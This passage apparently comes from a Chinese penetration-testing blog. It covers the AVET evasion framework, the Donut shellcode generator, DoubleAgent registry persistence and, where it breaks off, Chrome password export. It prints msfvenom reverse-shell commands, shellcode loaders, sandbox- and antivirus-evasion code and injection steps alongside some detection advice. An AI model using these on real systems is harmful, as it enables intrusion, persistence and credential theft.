{
	register unsigned char* r asm("eax");
	r=shellcode;
	asm("call *%eax;");
}
</code></pre></div></div>

<p>对应生成shellcode的参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x86/alpha_mixed -f hex -a x86 --platform Windows &gt; sc.txt
</code></pre></div></div>

<p>(3)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode64(unsigned char *shellcode)
{
	int len=strlen(shellcode);
	DWORD l=0;
	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&amp;l);
	(* (int(*)()) shellcode)();
}
</code></pre></div></div>

<p>生成shellcode的参数：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>shellcode的加密方法还可以选择shikata_ga_nai，使用shikata_ga_nai加密50轮的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -i 50 -f hex -a x86 --platform Windows &gt; sc.txt
</code></pre></div></div>

<p><strong>补充</strong>：</p>

<p>执行shellcode的方法不唯一，这里再给出另外一种执行shellcode的示例代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode(unsigned char *shellcode)
{
	((void(*)(void))&amp;shellcode)();
}
</code></pre></div></div>

<p>shellcode的生成方式也不唯一，可以按照自己的思路生成shellcode</p>

<h3 id="2自己实现的加解密算法">2、自己实现的加解密算法</h3>

<p>加密对应参数为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -E
</code></pre></div></div>

<p>解密对应的代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
{
	int j=0;
	shellcode=malloc((size/2));
	int i=0;
	do
	{
		unsigned char temp[3]={0};
		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
		shellcode[j] = strtoul(temp, NULL, 16);
		i+=2;
		j++;
	} while(i&lt;size);
	return shellcode;
}
</code></pre></div></div>

<h3 id="3绕过沙盒">3、绕过沙盒</h3>

<h4 id="1-使用winapi-fopen">(1) 使用WinAPI fopen</h4>

<p>将shellcode保存在文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code>中</p>

<p>主程序运行时读取文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code></p>

<p>如果在沙盒中，无法打开文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code>，主程序自动退出</p>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FILE *fp = fopen("c:\\windows\\system.ini", "rb");
if (fp == NULL)
	return 0;
fclose(fp);
</code></pre></div></div>

<h4 id="2-使用winapi-gethostbyname">(2) 使用WinAPI gethostbyname</h4>

<p>主程序调用WinAPI gethostbyname获得指定主机名的主机信息</p>

<p>如果在沙盒中，gethostbyname将会返回NULL，主程序自动退出</p>

<p>关键代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct hostent *hp = gethostbyname(KVALUE);
if (hp != NULL) 		
	exit(0);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>判断沙盒条件的方法不唯一，例如系统进程信息、配置信息、设备信息等</p>

<h3 id="4支持psexec远程执行">4、支持psexec远程执行</h3>

<p>主体程序更换为avetsvc.c</p>

<p>avetsvc.c相比于avet.c，代码添加了注册服务的功能，能够通过psexec以服务的方式远程启动</p>

<h2 id="0x06-免杀效果">0x06 免杀效果</h2>
<hr>

<p>具体免杀效果略</p>

<p>如果被查杀，可以尝试以下方法:</p>

<ul>
  <li>修改shellcode</li>
  <li>加密shellcode</li>
  <li>修改shellcode的加载方式</li>
  <li>使用含有数字签名的可信程序启动shellcode</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对avet进行实际测试，分析其中的技术细节，省略实际免杀效果。</p>

<p>总体来说，avet实现了一个完整的框架，在此基础上易于做二次开发，确实能够提高渗透测试人员的效率</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August 15, 2018
  </div>

  
</article><article class="post">
  <h1>Shellcode生成工具Donut测试分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Donut是一个shellcode生成工具，可以将.NET程序集转换为shellcode。这是对execute-assembly的进一步利用，隐蔽性更高，可扩展性更强。</p>

<p>结合byt3bl33d3r的<a href="https://github.com/byt3bl33d3r/SILENTTRINITY">SILENTTRINITY</a>，将其转换为shellcode并进行注入，适用性更广。</p>

<p>本文将会对Donut进行测试，逐个分析Donut工程中的代码，总结这个工具的特点。</p>

<p><strong>注：</strong></p>

<p>本文测试的版本使用的是Donut v0.9，新版本将会添加更多的功能，值得持续关注</p>

<p>Donut地址：</p>

<p>https://github.com/TheWover/donut</p>

<p>介绍Donut细节的文章：</p>

<p>https://thewover.github.io/Introducing-Donut/</p>

<p>https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/</p>

<p>https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>相关技术介绍</li>
  <li>源码结构</li>
  <li>实际测试</li>
  <li>利用分析</li>
</ul>

<h2 id="0x02-相关技术介绍">0x02 相关技术介绍</h2>
<hr>

<h3 id="1assemblyload">1.Assembly.Load</h3>

<p>用于在当前进程中加载.NET程序集，无法注入其他进程</p>

<p>.NET程序集的测试代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namespace ConsoleApplication1
{
    public class Program
    {
        public static void test()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";  
            p.Start();
        }
        static void Main(string[] args)
        {
            test();
        }   
    }
}
</code></pre></div></div>

<p>加载这个.NET程序集的时候会弹出计算器，用作验证功能</p>

<h4 id="1powershell实现assemblyload">(1)Powershell实现Assembly.Load</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$bytes = [System.IO.File]::ReadAllBytes("ConsoleApplication1.exe")
[Reflection.Assembly]::Load($bytes)
[ConsoleApplication1.Program]::test()
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">《利用Assembly Load &amp; LoadFile绕过Applocker的分析总结》</a></p>

<h4 id="2c实现assemblyload">(2)C#实现Assembly.Load</h4>

<p>https://github.com/anthemtotheego/SharpCradle</p>

<p>代码实现了从远程服务器下载.NET程序集并通过Assembly.Load进行加载</p>

<h3 id="2execute-assembly">2.execute-assembly</h3>

<p>从内存中加载.NET程序集，能够以dll的形式注入到其他进程中</p>

<p><strong>注：</strong></p>

<p>可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(execute-assembly)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《从内存加载.NET程序集(execute-assembly)的利用分析》</a></p>

<p>整个过程在内存执行，不写入文件系统(此时注入dll需要使用Dll反射)</p>

<p>Payload以dll形式存在，不会产生可疑的进程</p>

<p><strong>注：</strong></p>

<p>如果使用Loadlibrary加载dll，dll必须写入文件系统</p>

<h3 id="3donut">3.Donut</h3>

<p>基于execute-assembly，以shellcode的形式实现从内存中加载.NET程序集</p>

<p>优点是注入到其他进程时不再依赖于Dll反射，更隐蔽，更易于扩展</p>

<p>更隐蔽是指注入其他进程时不会存在dll</p>

<p>更易于扩展是指能够执行shellcode的方法都可以使用Donut，基于Donut的二次开发也很容易</p>

<h2 id="0x03-源码结构">0x03 源码结构</h2>
<hr>

<p>针对0.9版本的文件</p>

<h3 id="1子项目">1、子项目</h3>

<h4 id="1democreateprocess">1.DemoCreateProcess</h4>

<p>https://github.com/TheWover/donut/tree/master/DemoCreateProcess</p>

<p>c#程序，编译后生成文件ClassLibrary.dll，功能为将传入的两个参数作为启动进程</p>

<p>可通过Donut将其转换成shellcode，用作测试Donut生成shellcode的功能是否有效</p>

<h4 id="2donuttest">2.DonutTest</h4>

<p>https://github.com/TheWover/donut/tree/master/DonutTest</p>

<p>c#程序，编译后生成文件DonutTest.exe，用于向指定pid的进程注入shellcode</p>

<p>实现细节：</p>

<p>数组中保存base64加密后的shellcode，解密后通过CreateRemoteThread注入到指定进程</p>

<h4 id="3rundotnetcpp">3.rundotnet.cpp</h4>

<p>https://github.com/TheWover/donut/blob/master/DonutTest/rundotnet.cpp</p>

<p>c程序，编译后的文件为rundotnet.exe，用于读取指定文件并使用CLR从内存加载.NET程序集</p>

<p>从内存加载.NET程序集使用的方法：</p>

<ul>
  <li>使用当前系统中最新版本的.Net</li>
  <li>使用ICorRuntimeHost接口</li>
  <li>使用Load_3(…)从内存中读取并加载.NET程序集的Main方法</li>
</ul>

<h4 id="4modulemonitor">4.ModuleMonitor</h4>

<p>https://github.com/TheWover/donut/tree/master/ModuleMonitor</p>

<p>使用WMI事件Win32_ModuleLoadTrace来监视模块加载，如果发现CLR注入，将会标记</p>

<p>WMI事件Win32_ModuleLoadTrace：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/desktop/krnlprov/win32-moduleloadtrace</p>

<p>程序中判断CLR注入的方法：</p>

<p>如果进程加载了CLR，但程序不是.NET程序集，则CLR已注入其中</p>

<p>程序中判断进程加载CLR的方法：</p>

<p>进程是否加载了与CLR相关的dll(mscoree.dll,mscoreei.dll和mscorlib.dll)，dll以”msco”开头</p>

<p>这个工程一般是作防御检测用，用来检测系统是否产生了CLR注入事件，所以在启动后进程会一直执行，实时记录系统加载新模块的事件</p>

<p>这个地方使用tasklist.exe也能实现类似的功能，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m msco*
</code></pre></div></div>

<p>能够获得哪些进程调用了以”msco”开头的dll</p>

<h4 id="5processmanager">5.ProcessManager</h4>

<p>https://github.com/TheWover/donut/tree/master/ProcessManager</p>

<p>用于枚举当前计算机或远程计算机上的进程</p>

<p>同tasklist.exe的功能类似，增加以下功能：</p>

<ul>
  <li>判断进程权限</li>
  <li>判断进程位数(32位还是64位)</li>
  <li>判断进程是否加载CLR</li>
</ul>

<h3 id="2组件">2、组件</h3>

<h4 id="1httpsgithubcomthewoverdonutblobmasterpayloadpayloadc">1.https://github.com/TheWover/donut/blob/master/payload/payload.c</h4>

<p>Donut的关键功能，实现以下操作：</p>

<p>(1)获得shellcode并解密</p>

<p>提供两种方式：</p>

<ul>
  <li>从payload.h读取shellcode和解密密钥</li>
  <li>从HTTP服务器下载shellcode和解密密钥</li>
</ul>

<p>(2)使用CLR从内存加载.NET程序集</p>

<ul>
  <li>调用ICLRMetaHost::GetRuntime方法获取ICLRRuntimeInfo指针</li>
  <li>使用ICorRuntimeHost接口</li>
  <li>尝试关闭AMSI和WLDP</li>
  <li>使用Load_3(…)从内存中读取</li>
</ul>

<p><strong>注：</strong></p>

<p>介绍关闭AMSI和WLDP的细节：</p>

<p>https://modexp.wordpress.com/2019/06/03/disable-amsi-wldp-dotnet/</p>

<p>值得注意的地方：</p>

<p>通常情况下，使用ICorRuntimeHost接口时需要调用mscorlib.tlb</p>

<p>这里并没有使用mscorlib.tlb，是通过手动定义的方式实现</p>

<p>更多细节可参考：</p>

<p>https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/</p>

<h4 id="2httpsgithubcomthewoverdonuttreemasterpayloadexe2h">2.https://github.com/TheWover/donut/tree/master/payload/exe2h</h4>

<p>用来将exe转换为shellcode并保存到数组中</p>

<p>从payload.exe中的.text段中提取已编译的机器码(包括dll和解密密钥)，将其作为数组保存到payload_exe_x64.h或payload_exe_x86.h</p>

<h4 id="3httpsgithubcomthewoverdonutblobmasterpayloadpayload_exe_x64h">3.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x64.h</h4>

<p>存储64位的机器码(包括dll和解密密钥)</p>

<h4 id="4httpsgithubcomthewoverdonutblobmasterpayloadpayload_exe_x86h">4.https://github.com/TheWover/donut/blob/master/payload/payload_exe_x86.h</h4>

<p>存储32位的机器码(包括dll和解密密钥)</p>

<h4 id="5httpsgithubcomthewoverdonutblobmasterpayloadinjectc">5.https://github.com/TheWover/donut/blob/master/payload/inject.c</h4>

<p>使用RtlCreateUserThread向指定进程注入shellcode</p>

<p>可用作测试向指定进程注入shellcode的功能</p>

<h4 id="6httpsgithubcomthewoverdonutblobmasterpayloadrunscc">6.https://github.com/TheWover/donut/blob/master/payload/runsc.c</h4>

<p>C/S架构，两个功能，可以发送和接收shellcode并执行</p>

<p>用于测试payload.bin的功能</p>

<h4 id="7httpsgithubcomthewoverdonutblobmasterencryptc">7.https://github.com/TheWover/donut/blob/master/encrypt.c</h4>

<p>对称加密的实现</p>

<h4 id="8httpsgithubcomthewoverdonutblobmasterhashc">8.https://github.com/TheWover/donut/blob/master/hash.c</h4>

<p>API Hashing，这里使用了Maru hash</p>

<h4 id="9httpsgithubcomthewoverdonutblobmasterdonutc">9.https://github.com/TheWover/donut/blob/master/donut.c</h4>

<p>主程序，用于将.NET程序集转换成shellcode</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<h3 id="1选择测试dll">1、选择测试dll</h3>

<p>这里使用子项目DemoCreateProcess</p>

<p>编译后生成文件ClassLibrary.dll</p>

<h3 id="2使用donut生成shellcode">2、使用Donut生成shellcode</h3>

<p>64位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
</code></pre></div></div>

<p>32位：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 1 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe
</code></pre></div></div>

<p>命令执行后生成文件payload.bin</p>

<p>如果加了-u指定URL，会再生成一个随机名称的Module文件，实例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>donut.exe -a 2 -f ClassLibrary.dll -c TestClass -m RunProcess -p notepad.exe,calc.exe -u http://192.168.1.1
</code></pre></div></div>

<p>生成文件payload.bin和YX63F37T</p>

<p>将YX63F37T上传到http://192.168.1.1</p>

<p>接下来通过注入shellcode的方式执行payload.bin，payload.bin会从http://192.168.1.1/YX63F37T下载实际的shellcode并执行</p>

<h3 id="3查看进程信息">3、查看进程信息</h3>

<p>这里使用子项目ProcessManager</p>

<p>列出进程后，Managed选项如果为True，代表该进程已经加载CLR</p>

<p>ProcessManager支持对指定进程进行筛选，例如只查看notepad.exe的进行信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ProcessManager.exe --name notepad
</code></pre></div></div>

<h3 id="4注入shellcode">4、注入shellcode</h3>

<p>假设目标进程为3306</p>

<h4 id="1使用子项目donuttest">(1)使用子项目DonutTest</h4>

<p>将payload.bin作base64编码并保存在剪贴板，powershell命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filename = "payload.bin"
[Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
</code></pre></div></div>

<p>替换DonutTest工程中对应的变量，编译成功后执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DonutTest.exe 3306
</code></pre></div></div>

<h4 id="2使用rtlcreateuserthread">(2)使用RtlCreateUserThread</h4>

<p>https://github.com/TheWover/donut/blob/master/payload/inject.c</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>inject.exe 3306 payload.bin
</code></pre></div></div>

<h3 id="5检测">5、检测</h3>

<p>列出加载了CLR但不是.NET程序集的进程，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /m msco*
</code></pre></div></div>

<h2 id="0x05-利用分析">0x05 利用分析</h2>
<hr>

<p>Donut能够将.NET程序集转换为shellcode</p>

<p>也就是说，使用C#开发的程序都能通过Donut转换成shellcode</p>

<p>就目前的趋势来说，C#开源的工具越来越多，例如：</p>

<ul>
  <li>https://github.com/GhostPack/SharpWMI</li>
  <li>https://github.com/checkymander/Sharp-WMIExec</li>
  <li>https://github.com/jnqpblc/SharpTask</li>
</ul>

<p>在渗透测试中，C#将会逐步替代Powershell，Donut的利用也会是一个趋势</p>

<p>Donut的利用思路：</p>

<ol>
  <li>将.NET程序集转换为shellcode，例如配合SILENTTRINITY使用</li>
  <li>作为模块集成到其他工具中</li>
  <li>扩展功能：支持类似meterpreter的migrate功能</li>
</ol>

<p>为了更为隐蔽，可以先使用ProcessManager列举已经加载CLR的进程，对其进行注入</p>

<p>Donut的检测：</p>

<p>Donut需要使用CLR从内存中加载.NET程序集，可采取以下方法进行检测：</p>

<ul>
  <li>进程不是.NET程序集</li>
  <li>进程加载了与CLR相关的dll(dll以”msco”开头)</li>
</ul>

<p><strong>注：</strong></p>

<p>正常程序也有可能存在这个行为</p>

<p>两种检测方法：</p>

<ul>
  <li>使用命令<code class="language-plaintext highlighter-rouge">tasklist /m msco*</code></li>
  <li>使用WMI事件Win32_ModuleLoadTrace来监视模块加载</li>
</ul>

<p>对满足以上条件的进程重点监控</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Donut进行了测试分析，总结利用思路，给出防御建议。Donut值得深入研究，期待Donut的新版本</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 24, 2019
  </div>

  
</article><article class="post">
  <h1>渗透测试中的Application Verifier(DoubleAgent利用介绍)</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>近日，Cybellum Technologies LTD公开了一个0-day漏洞的POC，对其命名为“DoubleAgent”,可用于控制主流的杀毒软件</p>

<p>不同于以往的绕过思路，这次使用的是一种直接攻击并劫持的方式</p>

<p>本文将要介绍该方式的原理，分享利用思路、攻击条件和防御方法</p>

<p>Cybellum的博客链接如下：</p>

<p>https://cybellum.com/doubleagent-taking-full-control-antivirus/</p>

<p>https://cybellum.com/doubleagentzero-day-code-injection-and-persistence-technique/</p>

<p><strong>POC：</strong></p>

<p>https://github.com/Cybellum/DoubleAgent</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>该方式主要是对微软系统自带的Application Verifier（应用程序检验器）进行利用</p>

<p><strong>利用过程如下：</strong></p>

<ul>
  <li>编写自定义Verifier provider DLL</li>
  <li>通过Application Verifier进行安装</li>
  <li>注入到目标进程执行payload</li>
  <li>每当目标进程启动，均会执行payload，相当于一个自启动的方式</li>
</ul>

<p><strong>Application Verifier支持系统：</strong></p>

<p><code class="language-plaintext highlighter-rouge">WinXP-Win10</code></p>

<p>理论上，该利用方式支持WinXP-Win10，但是POC提供的dll在部分操作系统下会报错，修复方法暂略，本文仅挑选一个默认成功的系统进行测试——Win8.1 x86</p>

<h2 id="0x02-application-verifier">0x02 application verifier</h2>
<hr>

<p>是针对非托管代码的运行时验证工具，它有助于找到细小的编程错误、安全问题和受限的用户帐户特权问题，使用常规的应用程序测试技术很难识别出这些错误和问题</p>

<p><strong>注：</strong></p>

<p>类似于Application Compatibility Shims，可以理解为一种补丁机制</p>

<p>关于Application Compatibility Shims在渗透测试中的利用技巧可参照：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims/</p>

<p>更多基础概念可参考微软官方文档，地址如下：</p>

<p>https://msdn.microsoft.com/zh-cn/library/aa480483.aspx</p>

<p><strong>测试系统：</strong></p>

<p>Win8.1 x86(默认支持application verifier)</p>

<p>cmd输入(管理员权限)：</p>

<p><code class="language-plaintext highlighter-rouge">appverif </code></p>

<p>进入控制界面，通过面板查看配置验证器</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-1.png" alt="Alt text"></p>

<p>添加一个测试程序，可对其检测和调试内存损坏、危险的安全漏洞以及受限的用户帐户特权问题</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-2.png" alt="Alt text"></p>

<p>通过命令行也能够实现相同的操作</p>

<p>命令行添加：</p>

<p><code class="language-plaintext highlighter-rouge">appverif /verify notepad.exe</code></p>

<p>命令行删除：</p>

<p><code class="language-plaintext highlighter-rouge">appverif /n notepad.exe</code></p>

<p><strong>注：</strong></p>

<p>对于运行中的进程，不能安装application verifier</p>

<h2 id="0x03-实际测试">0x03 实际测试</h2>
<hr>

<p><strong>POC编译环境搭建：</strong></p>

<ul>
  <li>安装VS2017</li>
  <li>安装Windows SDK for Windows 8.1</li>
</ul>

<p><strong>测试系统：</strong></p>

<p>Win8.1 x86</p>

<p>POC添加shellcode：</p>

<p><code class="language-plaintext highlighter-rouge">MessageBox(NULL, NULL, NULL, 0);</code></p>

<p>部分代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static BOOL main_DllMainProcessAttach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	MessageBox(NULL, NULL, NULL, 0);
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);
}
</code></pre></div></div>

<p>编译后将DoubleAgent_x86.exe和\x86\DoubleAgentDll.dll放于同级目录下</p>

<p>cmd下：
(管理员权限)</p>

<p>安装：</p>

<p><code class="language-plaintext highlighter-rouge">DoubleAgent_x86.exe install notepad.exe</code></p>

<p>卸载：</p>

<p><code class="language-plaintext highlighter-rouge">DoubleAgent_x86.exe uninstall notepad.exe</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-3.png" alt="Alt text"></p>

<p>安装后，启动notepad.exe，弹框，之后正常启动notepad.exe</p>

<p>安装成功后，在面板中也可以看到安装的verifier</p>

<p>cmd输入appverif</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-28/2-4.png" alt="Alt text"></p>

<p>如果想要劫持非系统默认安装的程序，那么该程序需要存放于system32文件夹下(或者新建快捷方式存放于system32并指向原程序)</p>

<p>需要先将DoubleAgentDll.dll复制到system32下，再通过命令行安装</p>

<p>安装成功后，在注册表会保存安装信息：</p>

<p>注册表位置：</p>

<p><code class="language-plaintext highlighter-rouge">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe]</code></p>

<p>键值信息如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"GlobalFlag"="0x100"
"VerifierDlls"="DoubleAgentDll.dll"
</code></pre></div></div>

<p>如果删除该注册表键值，那么verifier失效</p>

<p><strong>注：</strong></p>

<p>查看poc源码发现安装操作是通过新建注册表键值的方法</p>

<p>所以下面尝试通过脚本新建注册表键值来实现verifier的安装：</p>

<p><strong>1、powershell测试代码实现注册表键值的添加</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-Item -itemType DWord "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
New-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -name GlobalFlag -propertytype Dword -value 0x100
New-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -name VerifierDlls -propertytype String -value DoubleAgentDll.dll
</code></pre></div></div>

<p><strong>2、将测试dll复制到system32下</strong></p>

<p><code class="language-plaintext highlighter-rouge">copy DoubleAgentDll.dll c:\windows\system32\DoubleAgentDll.dll</code></p>

<p><strong>3、再次启动notepad.exe，弹框</strong></p>

<p>代表verifier被安装</p>

<p><strong>4、删除verifier的powershell代码：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Del "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" -recurse</code></p>

<p><strong>注：</strong></p>

<p>部分杀毒软件会对注册表<code class="language-plaintext highlighter-rouge">HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</code>进行监控</p>

<p><strong>绕过方法：</strong></p>

<p>新建一个任意名称的注册表键值，再重命名为目标程序</p>

<h2 id="0x04-分析">0x04 分析</h2>
<hr>

<p><strong>利用方式：</strong></p>

<ul>
  <li>dll注入</li>
  <li>自启动</li>
</ul>

<p>主要用于后渗透阶段</p>

<p><strong>特别的地方：</strong></p>

<p>绕过杀毒软件的拦截，并能够对杀毒软件本身进行注入，使杀毒软件本身失效或者对其利用</p>

<p><strong>攻击条件：</strong></p>

<p>获得管理员权限</p>

<p><strong>POC——&gt;EXP:</strong></p>

<p>参照其中DoubleAgentDll工程生成dll，通过powershell或其他脚本实现安装利用</p>

<p><strong>防御方法：</strong></p>

<ul>
  <li>监控注册表键值HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</li>
  <li>控制管理员权限</li>
  <li>查看system32下有无可疑dll和快捷方式</li>
</ul>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对“DoubleAgent”的原理、利用思路、攻击条件和防御方法作了简要介绍，希望能够帮助大家</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on March 28, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——导出Chrome浏览器中保存的密码</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在后渗透阶段，获得权限后需要搜集目标系统的信息。信息越全面，越有助于进一步的渗透。对于Windows系统，用户浏览器往往包含有价值的信息。</p>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%9C%AC%E5%9C%B0%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7LaZagne%E4%B8%AD%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">《本地密码查看工具LaZagne中的自定义脚本开发》</a>曾介绍过利用LaZagne导出多个浏览器密码的方法。</p>

<p>本文将要针对Chrome浏览器，介绍具体的导出原理和利用方法，解决一个实际问题： <code class="language-plaintext highlighter-rouge">如何导出另一系统下Chrome浏览器中保存的密码？</code></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Chrome浏览器保存密码的方式</li>
  <li>如何导出Chrome浏览器中保存的密码</li>
  <li>常用方法的限制</li>
  <li>如何导出另一系统下Chrome浏览器中保存的密码</li>
</ul>

<h2 id="0x02-chrome浏览器保存密码的方式">0x02 Chrome浏览器保存密码的方式</h2>
<hr>

<p>正常用户在访问网站时，可选择使用Chrome浏览器保存登录的用户密码，用于下次登录的时候Chrome自动填写登录密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-0.png" alt="Alt text"></p>

<p>在Chrome中可以查看保存的登录密码(需要提供用户口令)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-1.png" alt="Alt text"></p>

<p>Chrome中保存的密码先被二次加密，然后被保存在SQLite数据库文件中，位置如下：</p>

<p><code class="language-plaintext highlighter-rouge">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></p>

<h3 id="实际测试">实际测试：</h3>

<p>测试系统： Win7x86</p>

<p>Chrome版本： 63.0.3239.132</p>

<p>定位SQLite数据库文件，位于<code class="language-plaintext highlighter-rouge">C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Login Data</code></p>

<p>使用工具读取数据库文件，测试工具： SQLiteStudio</p>

<p>下载地址：</p>

<p>https://sqlitestudio.pl/index.rvt</p>

<p><strong>注：</strong></p>

<p>SQLiteStudio开源，特点是支持查看十六进制数据(SQLiteSpy不支持查看十六进制数据)</p>

<p>成功读取数据库文件保存的信息，但password段无法显示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-2.png" alt="Alt text"></p>

<p>选择<code class="language-plaintext highlighter-rouge">Form view</code>，查看十六进制格式，获得二次加密后的用户密码，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-25/2-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

